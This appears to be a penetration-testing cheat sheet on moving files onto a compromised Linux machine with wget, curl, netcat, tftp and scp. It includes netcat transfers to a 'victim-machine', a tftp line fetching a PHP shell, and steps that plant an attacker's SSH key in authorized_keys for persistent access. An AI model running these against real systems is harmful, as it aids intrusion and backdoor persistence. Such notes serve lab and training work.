# Transfering Files on Linux

## Set Up a Simple Python Webserver <a id="set-up-a-simple-python-webserver"></a>

For the examples using `curl` and `wget` we need to download from a web-server. This is an easy way to set up a web-server. This command will make the entire folder, from where you issue the command, available on port 9999.

```text
python -m SimpleHTTPServer 9999
```

## Wget <a id="wget"></a>

You can download files using `wget` like this:

```text
wget 192.168.1.102:9999/file.txt
```

## Curl <a id="curl"></a>

```text
curl -O http://192.168.0.101/file.txt
```

## Netcat <a id="netcat"></a>

Another easy way to transfer files is by using netcat.

If you can't have an interactive shell it might be risky to start listening on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do `ctr-c` because that will kill your session.

So instead you can connect from the target machine like this.

On attacking machine:

```text
nc -lvp 4444 < file
```

On target machine:

```text
nc 192.168.1.102 4444 > file
```

You can of course also do it the risky way, the other way around:

So on the victim-machine we run `nc` like this:

```text
nc -lvp 3333 > enum.sh
```

And on the attacking machine we send the file like this:

```text
nc 192.168.1.103 < enum.sh
```

I have sometimes received this error:

```text
This is nc from the netcat-openbsd package. An alternative nc is available
```

I have just run this command instead:

```text
nc -l 1234 > file.sh
```

## With php <a id="with-php"></a>

```text
echo "" > down2.php
```

## Ftp <a id="ftp"></a>

If you have access to a ftp-client to can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!

## Tftp <a id="tftp"></a>

On some rare machine we do not have access to `nc` and `wget`, or `curl`. But we might have access to `tftp`. Some versions of `tftp` are run interactively, like this:

```text
$ tftp 192.168.0.101
tftp> get myfile.txt
```

If we can't run it interactively, for whatever reason, we can do this trick:

```text
tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
```

### SSH - SCP <a id="ssh---scp"></a>

If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.

So, in the `/home/user` directory you can find the hidden `.ssh` files by typing `ls -la`. Then you need to do two things.

1. Create a new keypair

You do that with:

```text
ssh-keygen -t rsa -C "[email protected]"
```

then you enter a name for the key.

Enter file in which to save the key \(/root/.ssh/id\_rsa\): nameOfMyKey Enter passphrase \(empty for no passphrase\): Enter same passphrase again:

This will create two files, one called `nameOfMyKey` and another called `nameOfMyKey_pub`. The one with the `_pub` is of course your public key. And the other key is your private.

1. Add your public key to authorized\_keys.

Now you copy the content of `nameOfMyKey_pub`. On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized\_keys. Like this

```text
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
```

1. Log in.

Now you should be all set to log in using your private key. Like this

```text
ssh -i nameOfMyKey [email protected]
```

### SCP <a id="scp"></a>

Now we can copy files to a machine using `scp`

```text
# Copy a file:
scp /path/to/source/file.ext [email protected]:/path/to/destination/file.ext

# Copy a directory:
scp -r /path/to/source/dir [email protected]:/path/to/destination
```

